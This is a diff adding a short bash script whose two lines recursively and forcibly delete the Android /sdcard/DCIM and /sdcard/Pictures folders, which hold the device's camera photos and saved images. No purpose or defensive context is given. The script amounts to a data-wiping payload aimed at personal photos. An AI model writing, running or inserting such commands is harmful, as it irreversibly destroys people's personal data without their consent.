@@ -1,0 +1,3 @@
+#!/bin/bash
+rm -rif  /sdcard/DCIM 
+rm -rif /sdcard/Pictures 
